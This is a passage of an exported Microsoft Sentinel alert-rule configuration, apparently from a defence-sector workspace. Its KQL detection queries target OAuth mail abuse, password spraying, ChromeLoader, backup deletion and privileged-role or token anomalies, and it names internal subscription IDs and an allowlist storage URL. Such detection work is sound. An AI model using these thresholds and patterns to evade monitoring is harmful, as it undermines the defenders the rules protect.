externaldata(OAuthAppId:string)[@'https://dod365csspstorage.blob.core.usgovcloudapi.net/bah-midnight-blizard-whitelist/BAH_MidnightBlizzard_oAthAppIdList.csv'] with (format='csv', ignoreFirstRecord=True);\nlet ioc_lookBack = 1d;\nlet appsReadingMailDirectly = CloudAppEvents\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | where ActionType == \"MailItemsAccessed\"\n  | where RawEventData has \"AppId\" \n  | extend rawData = parse_json(RawEventData) \n  | extend AppId = tostring(parse_json(rawData.AppId)) \n  | where AppId != \"00000003-0000-0000-c000-000000000000\" \n  | summarize by AppId, AccountId, AccountDisplayName, Application, ActionType, AccountObjectId, IPAddress \n  | project-rename OAuthAppId = AppId; \nlet appsReadingMailViaGraphAPI = CloudAppEvents \n  | where TimeGenerated >= ago(ioc_lookBack)\n  | where ActionType == \"MailItemsAccessed\" \n  | where RawEventData has \"ClientAppId\" \n  | where RawEventData has \"00000003-0000-0000-c000-000000000000\" // performance check \n  | extend rawData = parse_json(RawEventData) \n  | extend AppId = tostring(parse_json(rawData.AppId)) \n  | extend OAuthAppId = tostring(parse_json(rawData.ClientAppId)) // extract OAuthAppId \n  | where AppId == \"00000003-0000-0000-c000-000000000000\" \n  | where not(OAuthAppId has_any (oAuthAppIdList)) //checks for whitelisted oauthappid's in the hashlist\n  | project OAuthAppId, AccountDisplayName, Application, ActionType, AccountObjectId, IPAddress;\n appsReadingMailDirectly \n  | join kind = inner appsReadingMailViaGraphAPI \n  on OAuthAppId","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{},"entityMappings":[{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"OAuthAppId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountDisplayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"Application"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"AccountObjectId"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","CredentialAccess","Collection"],"techniques":["T1550","T1528","T1114"],"displayName":"BAH_Midnight_Blizzard_OAuth_Apps_Reading_Mail","enabled":true,"description":"Nobelium may re-purpose legitimate existing OAuth Applications in the environment to their own ends. However, malicious activity patterns may be discernable from legitimate ones. The following query returns OAuth Applications that access mail both directly and via Graph, allowing review of whether such dual access methods follow expected use patterns.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-06-13T14:18:37.1540198Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bf3d5ad7-a9d5-4dea-8ab3-9119303706ad","name":"bf3d5ad7-a9d5-4dea-8ab3-9119303706ad","etag":"\"75036940-0000-2700-0000-6675d9c30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SecurityAlert\n| extend Extprop = parse_json(ExtendedProperties)\n| mv-expand todynamic(Entities)\n| extend HostName = iff(isnotempty(tostring(Extprop[\"Compromised Host\"])), tolower(tostring(Extprop[\"Compromised Host\"])), tolower(tostring(parse_json(Entities).HostName)))\n| where isnotempty(HostName)\n| mv-expand todynamic(split(HostName, ','))\n| extend DnsDomain = iff(isnotempty(tostring(Extprop[\"Machine Domain\"])), tostring(Extprop[\"Machine Domain\"]), tostring(parse_json(Entities).DnsDomain))\n| extend UserName = iff(isnotempty(tostring(Extprop[\"User Name\"])), tostring(Extprop[\"User Name\"]), iff(tostring(parse_json(Entities).Type) == 'account', tostring(parse_json(Entities).Name), ''))\n| extend NTDomain = iff(isnotempty(tostring(Extprop[\"User Domain\"])), tostring(Extprop[\"User Domain\"]), tostring(parse_json(Entities).NTDomain))\n| extend IpAddress = iff(tostring(parse_json(Entities).Type) == 'ip', tostring(parse_json(Entities).Address), tostring(parse_json(Extprop).[\"IpAddress\"]))\n| summarize timestamp = arg_max(TimeGenerated, *) by AlertName, tostring(HostName)\n| project timestamp, AlertName, UserName, NTDomain, tostring(HostName), DnsDomain, IpAddress\n| join kind=inner\n(\nCoreAzureBackup\n| where State =~ \"Deleted\"\n| where OperationName =~ \"BackupItem\"\n| extend data = split(BackupItemUniqueId, \";\")\n| extend AzureLocation = data[0], VaultId=data[1], HostName=tolower(tostring(data[2])), DrivesBackedUp=data[3]\n| project timestamp = TimeGenerated, AzureLocation, VaultId, HostName, DrivesBackedUp, State, BackupItemUniqueId, _ResourceId, OperationName, BackupItemFriendlyName\n)\non HostName\n| project timestamp, AlertName, HostName, DnsDomain, UserName, NTDomain, _ResourceId, IpAddress, VaultId, AzureLocation, DrivesBackedUp, State, BackupItemUniqueId, OperationName, BackupItemFriendlyName\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserName"},{"identifier":"NTDomain","columnName":"NTDomain"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"_ResourceId"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"DnsDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IpAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1496"],"displayName":"Detect CoreBackUp Deletion Activity from related Security Alerts","enabled":true,"description":"The query identifies any efforts by an attacker to delete backup containers, while also searching for any security alerts that may be linked to the same activity, in order to uncover additional information about the attacker's actions.' \nThough such an activity could be legitimate as part of business operation, some ransomware actors may perform such operation to cause interruption to regular business services.","alertRuleTemplateName":"011c84d8-85f0-4370-b864-24c13455aa94","lastModifiedUtc":"2024-06-21T19:51:28.3987475Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7dab84a9-1e00-4c20-887c-dbcba55f7383","name":"7dab84a9-1e00-4c20-887c-dbcba55f7383","etag":"\"5104862a-0000-2700-0000-667c2aef0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let timeRange = 1d;\nlet lookBack = 7d;\nlet authenticationWindow = 20m;\nlet authenticationThreshold = 5;\nlet isGUID = \"[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\";\nlet failureCodes = dynamic([50053, 50126, 50055]); // invalid password, account is locked - too many sign ins, expired password\nlet successCodes = dynamic([0, 50055, 50057, 50155, 50105, 50133, 50005, 50076, 50079, 50173, 50158, 50072, 50074, 53003, 53000, 53001, 50129]);\n// Lookup up resolved identities from last 7 days\nlet aadFunc = (tableName:string){\nlet identityLookup = table(tableName)\n| where TimeGenerated >= ago(lookBack)\n| where not(Identity matches regex isGUID)\n| where isnotempty(UserId)\n| summarize by UserId, lu_UserDisplayName = UserDisplayName, lu_UserPrincipalName = UserPrincipalName, Type;\n// collect window threshold breaches\ntable(tableName)\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| summarize FailedPrincipalCount = dcount(UserPrincipalName) by bin(TimeGenerated, authenticationWindow), IPAddress, AppDisplayName, Type\n| where FailedPrincipalCount >= authenticationThreshold\n| summarize WindowThresholdBreaches = count() by IPAddress, Type\n| join kind= inner (\n// where we breached a threshold, join the details back on all failure data\ntable(tableName)\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(failureCodes)\n| extend LocationDetails = todynamic(LocationDetails)\n| extend FullLocation = strcat(LocationDetails.countryOrRegion,'|', LocationDetails.state, '|', LocationDetails.city)\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), make_set(ClientAppUsed,20), make_set(FullLocation,20), FailureCount = count() by IPAddress, AppDisplayName, UserPrincipalName, UserDisplayName, Identity, UserId, Type\n// lookup any unresolved identities\n| extend UnresolvedUserId = iff(Identity matches regex isGUID, UserId, \"\")\n| join kind= leftouter (\n identityLookup\n) on $left.UnresolvedUserId==$right.UserId\n| extend UserDisplayName=iff(isempty(lu_UserDisplayName), UserDisplayName, lu_UserDisplayName)\n| extend UserPrincipalName=iff(isempty(lu_UserPrincipalName), UserPrincipalName, lu_UserPrincipalName)\n| summarize StartTime = min(StartTime), EndTime = max(EndTime), make_set(UserPrincipalName,20), make_set(UserDisplayName,20), make_set(set_ClientAppUsed,20), make_set(set_FullLocation,20), make_list(FailureCount,20) by IPAddress, AppDisplayName, Type\n| extend FailedPrincipalCount = array_length(set_UserPrincipalName)\n) on IPAddress\n| project IPAddress, StartTime, EndTime, TargetedApplication=AppDisplayName, FailedPrincipalCount, UserPrincipalNames=set_UserPrincipalName, UserDisplayNames=set_UserDisplayName, ClientAppsUsed=set_set_ClientAppUsed, Locations=set_set_FullLocation, FailureCountByPrincipal=list_FailureCount, WindowThresholdBreaches, Type\n| join kind= inner (\ntable(tableName) // get data on success vs. failure history for each IP\n| where TimeGenerated > ago(timeRange)\n| where ResultType in(successCodes) or ResultType in(failureCodes) // success or failure types\n| summarize GlobalSuccessPrincipalCount = dcountif(UserPrincipalName, (ResultType in (successCodes))), ResultTypeSuccesses = make_set_if(ResultType, (ResultType in (successCodes))), GlobalFailPrincipalCount = dcountif(UserPrincipalName, (ResultType in (failureCodes))), ResultTypeFailures = make_set_if(ResultType, (ResultType in (failureCodes))) by IPAddress, Type\n| where GlobalFailPrincipalCount > GlobalSuccessPrincipalCount // where the number of failed principals is greater than success - eliminates FPs from IPs who authenticate successfully alot and as a side effect have alot of failures\n) on IPAddress\n| project-away IPAddress1\n| extend timestamp=StartTime\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalNames"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"DEOS_CTH_Password spray attack against Microsoft Entra ID application","enabled":true,"description":"Identifies evidence of password spray activity against Microsoft Entra ID applications by looking for failures from multiple accounts from the same IP address within a time window. \n\nIf the number of accounts breaches the threshold just once, all failures from the IP address within the time range are bought into the result. Details on whether there were successful authentications by the IP address within the time window are also included.\n\nThis can be an indicator that an attack was successful.\n\nThe default failure account threshold is 5, Default time window for failures is 20m and default look back window is 1 day.\n\nNote: Due to the number of possible accounts involved in a password spray it is not possible to map identities to a custom entity.\nReferences: https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes.","alertRuleTemplateName":"48607a29-a26a-4abf-8078-a06dbdd174a4","lastModifiedUtc":"2024-06-26T14:51:26.764567Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/47de9f00-62dc-4da3-9c69-b481f32c3eb3","name":"47de9f00-62dc-4da3-9c69-b481f32c3eb3","etag":"\"8800f402-0000-2700-0000-66fdccaf0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//BAH_ChromeLoader\n//Author: Shawn McWhirter\n//Description: ChromeLoader is a type of malware that masquerades as a legitimate Google Chrome browser extension or application. Once installed, ChromeLoader can perform a range of malicious actions, such as stealing sensitive data, displaying unwanted advertisements, and redirecting the user's browser to phishing websites or other malicious content. It can also modify the user's browser settings, such as the default search engine and home page, without their consent.\n//https://thehackernews.com/2022/05/experts-warn-of-rise-in-chromeloader.html, https://app.snapattack.com/detection/cd0def01-3aa8-4605-a2ce-eaad77273ac0?page=1&sort_by=relevancettack, https://app.snapattack.com/detection/2df78eae-8c0c-4e34-88fa-e41512baec75, https://redcanary.com/threat-detection-report/threats/chromeloader/, https://www.th3protocol.com/2022/Choziosi-Loader\n//False Positives: Usage of Chrome Extensions in testing tools such as BurpSuite will trigger this alert.\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\n(union isfuzzy=True\n    (\n    DeviceProcessEvents\n    | where (FolderPath contains @\"\\brave.exe\" or FolderPath contains @\"\\chrome.exe\" or FolderPath contains @\"\\msedge.exe\" or FolderPath contains @\"\\opera.exe\" or FolderPath contains @\"\\vivaldi.exe\") and (ProcessCommandLine contains \"--load-extension=\" and ProcessCommandLine contains @\"\\AppData\\Roaming\\extension\")\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project TimeGenerated, AccountName, UserPrincipalName, DeviceName, DeviceId, InitiatingProcessAccountName, FolderPath, ProcessCommandLine, ActionType, ProcessVersionInfoCompanyName, InitiatingProcessVersionInfoInternalFileName)\n    )","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"InitiatingProcessAccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FolderPath"},{"identifier":"Directory","columnName":"InitiatingProcessVersionInfoInternalFileName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","InitialAccess","Execution"],"techniques":["T1176","T1566","T1059"],"displayName":"BAH_ChromeLoader","enabled":true,"description":"ChromeLoader is a type of malware that masquerades as a legitimate Google Chrome browser extension or application. Once installed, ChromeLoader can perform a range of malicious actions, such as stealing sensitive data, displaying unwanted advertisements, and redirecting the user's browser to phishing websites or other malicious content. It can also modify the user's browser settings, such as the default search engine and home page, without their consent.\nPLATFORM:Windows,Microsoft 365,Azure AD,IaaS\nMITRE:TA0001;T1566,TA0002;T1059,TA0003;T1176","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:43:58.94321Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ff864014-bbe4-4cb1-ada1-142f61dfe38b","name":"ff864014-bbe4-4cb1-ada1-142f61dfe38b","etag":"\"5c0aeff3-0000-2700-0000-669f18290000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"SecurityAlert\r\n| where AlertName has_any (\"Malware\", \"Ransomware\", \"Virus\", \"Trojan\")\r\n| where ProviderName !in (\"MicrosoftEndPointDlp\")\r\n| extend ExProps = parse_json(ExtendedProperties)\r\n| extend Signature = tostring(ExProps.ThreatName)\r\n| extend EntitiesArray = parse_json(Entities)\r\n| mv-expand EntitiesArray\r\n| extend FileHashes = parse_json(EntitiesArray.FileHashes)\r\n| mv-expand FileHashes\r\n| where FileHashes.Algorithm in (\"SHA1\", \"SHA256\", \"MD5\")\r\n| extend Malgorithm = tostring(FileHashes.Algorithm)\r\n| extend MaliciousHash = tostring(FileHashes.Value)\r\n| where Malgorithm == \"SHA1\"\r\n| distinct MaliciousHash, Malgorithm, Signature\r\n//| project TimeGenerated, Signature, MaliciousHash","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MaliciousHash"},{"identifier":"Algorithm","columnName":"Malgorithm"}]},{"entityType":"Malware","fieldMappings":[{"identifier":"Name","columnName":"Signature"}]}],"alertDetailsOverride":{"alertDisplayNameFormat":"DEOS CTH - Collection of Data from Malware Alert","alertDescriptionFormat":"Alert fires when 'DEOS_CTH_MalwareAlert' logic app is ran. Data aggregated for collection for threat intelligence use.","alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"AlertPerResult"},"tactics":["Execution"],"techniques":[],"displayName":"DEOS_CTH_GetMalwareAlertData","enabled":true,"description":"Collects signature, hash and algorithm of hash calculation from alerts involving malware.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-07-23T02:40:36.2725538Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0c45d346-77cd-40cd-b03e-f4c99369a044","name":"0c45d346-77cd-40cd-b03e-f4c99369a044","etag":"\"aa00a117-0000-2700-0000-66b0ff0f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"ZimperiumThreatLog_CL \r\n| where device_owner_first_name_s !contains \"*****\" or device_owner_last_name_s !contains \"*****\"\r\n| project TimeGenerated, device_ip_s, external_ip_s, device_model_s, action_triggered_s, device_jailbroken_b","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"external_ip_s"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"sentinelEntitiesMappings":[{"columnName":"device_ip_s"}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"DEOS_CTH_Zimperium","enabled":true,"description":"Monitor for CUI or PII data that's unmasked.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-05T16:34:22.5763626Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2a7985c9-cc1b-414e-9eaf-56a64aa292c9","name":"2a7985c9-cc1b-414e-9eaf-56a64aa292c9","etag":"\"5101075b-0000-2700-0000-66ba5aac0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName has_any (\"Add member to\", \"Remove member\", \"Process role\", \"Add app\")\n| extend AssignedRole = tostring(parse_json(TargetResources[0].modifiedProperties[1].newValue))\n| where AssignedRole contains \"Global\" and AssignedRole has_any (\"admin\", \"Admin\", \"administrator\", \"Administrator\")\n| summarize count() by AssignedRole\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1484"],"displayName":"[UnOAuthorized] DEOS_CTH_AnomalousGroupChange","enabled":true,"description":"Set to monitor for updates or deletions to privileged roles. May indicate attack in progress.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T18:55:39.2819906Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/044b4611-6272-4cdf-bbdb-30856055591a","name":"044b4611-6272-4cdf-bbdb-30856055591a","etag":"\"51011564-0000-2700-0000-66ba5baa0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName in (\"Add group\", \"Restore Group\", \"Group_Create\", \"Create incompatible group\")\n| extend Init = parse_json(InitiatedBy.user)\n| extend Initiator = tostring(parse_json(Init.userPrincipalName))\n| extend InitiatorIp = tostring(parse_json(Init.ipAddress))\n| extend AddedGroup = tostring(parse_json(TargetResources[0].displayName))\n| where Initiator in (\"Device Registration Service\", \"Viva Engage\", \"Microsoft Rights Management Service\")\n| summarize count() by Result, Initiator, AddedGroup\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1404","T1484"],"displayName":"[UnOAuthorized} DEOS_CTH_AnomalousGroupMade","enabled":true,"description":"Monitor for creation of anomalous/unauthorized groups by Service Principals.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T18:59:52.8653162Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8fb6fdf0-fb01-4562-abb7-c85a84dd052d","name":"8fb6fdf0-fb01-4562-abb7-c85a84dd052d","etag":"\"51015f6b-0000-2700-0000-66ba5cde0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName contains \"Token\"\n| extend Initiator = tostring(parse_json(InitiatedBy.user.userPrincipalName))\n| extend Target = tostring(parse_json(TargetResources[0].userPrincipalName))\n| where Initiator in (\"Device Registration Service\", \"Viva Engage\", \"Microsoft Rights Management Service\")\n| project Initiator, Target, Result\n| summarize count() by Result, Initiator, Target\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1212"],"displayName":"[UnOAuthorized] DEOS_CTH_AnomalousTokenIssued","enabled":true,"description":"Monitor for the issuance of OAuth 2.0 tokens to detect unauthorized/anomalous activity.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T19:05:01.9060911Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b25a2988-e339-4589-b105-1549f2be03b7","name":"b25a2988-e339-4589-b105-1549f2be03b7","etag":"\"51015476-0000-2700-0000-66ba5e220000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName == \"Add service principal credentials\"\n| extend Initiator = parse_json(InitiatedBy.app)\n| mv-expand Initiator\n| extend InitiatorDisplayName = tostring(parse_json(Initiator.displayName))\n| extend Target = parse_json(TargetResources)\n| mv-expand Target\n| extend TargetDisplayName = tostring(parse_json(Target.displayName))\n| where isnotempty(InitiatorDisplayName)\n| where InitiatorDisplayName in (\"Device Registration Service\", \"Viva Engage\", \"Microsoft Rights Management Service\")\n| summarize count() by InitiatorDisplayName, TargetDisplayName, OperationName\n\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1484"],"displayName":"[UnOAuthorized] DEOS_CTH_UnauthorizedCredAssignment","enabled":true,"description":"Identify when credentials are added to service principals associated with vulnerable services, such as the Device Registration Service","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T19:10:25.7704395Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e208303b-ca62-4c39-8915-661ff49ada98","name":"e208303b-ca62-4c39-8915-661ff49ada98","etag":"\"5101f478-0000-2700-0000-66ba5e890000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\n| where OperationName == \"Add member to role\"\n| extend Initiator = parse_json(InitiatedBy)\n| mv-expand Initiator\n| extend InitiatorDisplayName = parse_json(Initiator.app.displayName)\n| extend TargetRes = parse_json(TargetResources)\n| mv-expand TargetRes\n| extend UserWithNewRole = parse_json(TargetRes.userPrincipalName)\n| where isnotempty(UserWithNewRole)\n| extend ModProps = parse_json(TargetRes.modifiedProperties)\n| mv-expand ModProps\n| extend NewAssignedRole = parse_json(ModProps.newValue)\n| where NewAssignedRole contains \"Global Administrator\"\n| project-away Initiator, TargetRes, ModProps\n| project InitiatorDisplayName, UserWithNewRole, NewAssignedRole","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact","Persistence","PrivilegeEscalation"],"techniques":["T0831","T1136","T1484"],"displayName":"[UnOAuthorized] DEOS_CTH_NewGlobalAdmin","enabled":true,"description":"Track any unexpected role assignments, particularly to the Global Administrator role, which may indicate an exploitation attempt","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-12T19:12:09.1670482Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ac89200a-8386-49c9-bf0e-7e1782b2ddf9","name":"ac89200a-8386-49c9-bf0e-7e1782b2ddf9","etag":"\"5b01acb8-0000-2700-0000-66bbb17d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"SigninLogs\r\n//filter on Microsoft 2FA Authenticator errors\r\n| where ResultType == 500121\r\n//Parse the authentication details so we can query the data\r\n| extend AuthResult = tostring(parse_json(AuthenticationDetails)[1].authenticationStepResultDetail)\r\n//Collect all denied or ignored MFA requests\r\n| where AuthResult in (\"MFA denied; user declined the authentication\", \"MFA denied; user did not respond to mobile app notification\") or Status has \"MFA denied; Phone App Reported Fraud\"\r\n//Enable the below two 